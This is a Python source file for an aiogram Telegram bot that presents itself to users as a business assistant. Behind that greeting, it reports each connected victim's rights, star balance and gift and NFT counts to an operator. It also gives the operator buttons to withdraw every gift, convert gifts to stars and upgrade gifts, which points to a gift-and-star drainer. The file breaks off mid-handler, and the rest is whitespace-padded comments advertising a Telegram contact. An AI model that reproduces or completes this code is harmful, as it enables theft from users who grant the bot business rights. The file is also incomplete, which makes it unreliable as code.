from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars, UpgradeGift
from aiogram.types import InputMediaPhoto


from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
import gpt_answer

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
RECEIVER_ID = config.RECEIVER_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, admin_ids, _bot):
    try:
        for admin_id in ADMIN_ID:
            rights = connection.rights
            business_connection = connection

            rights_text = "\n".join([
                f"📍 <b>Права бота:</b>",
                f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
                f"▫️ Удаление своих сообщений: {'✅' if rights.can_delete_outgoing_messages else '❌'}",
                f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
                f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
                f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
                f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
                f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
                f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
                f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
                f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
                f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
                f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
                f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
                f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
            ])

            star_amount = 0
            all_gifts_amount = 0
            unique_gifts_amount = 0

            if rights.can_view_gifts_and_stars:
                response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
                star_amount = response.star_amount

                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
                all_gifts_amount = len(gifts.gifts)
                unique_gifts_amount = 0

                for gift in gifts.gifts:
                    if gift.type == "unique": unique_gifts_amount += 1

            star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
            all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
            unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

            msg = (
                f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
                f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
                f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
                f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
                f"\n{rights_text}"
                f"\n\n⭐️ Звезды: <code>{star_amount_text}</code>"
                f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
                f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
            )
            keyboard = InlineKeyboardMarkup(
                            inline_keyboard=[
                                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты",callback_data=f"upgrade_user:{user_id}")]
                            ]
                        )
            await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if gift.owned_gift_id == owned_gift_id:
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
    except Exception as e:
        return "🎁 Нет подарков."


@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, ADMIN_ID, bot)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил моего бота как бизнес-ассистента.")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
        
        
        
        # contact @lovelayss on tg
        
                                                                  # contact @lovelayss on tg
                                                                  
                                                                  
                                                                  
                                                                  
                                  # contact @lovelayss on tg
                                  
                                  
                                  
                                  
                                  
                                  
  # contact @lovelayss on tg                                                
                                                                                      # contact @lovelayss on tg
                                                                                      
                                                                                      
                                                                                      
                                                                                      
                                                                      # contact @lovelayss on tg
        
          # contact @lovelayss on tg
          
          
          
          
          
            # contact @lovelayss on tg                                                                # contact @lovelayss on tg
            
            
            
            
            #чел яйцо
            
  # contact @lovelayss on tg                                            
                                                                          # contact @lovelayss on tg
        
  
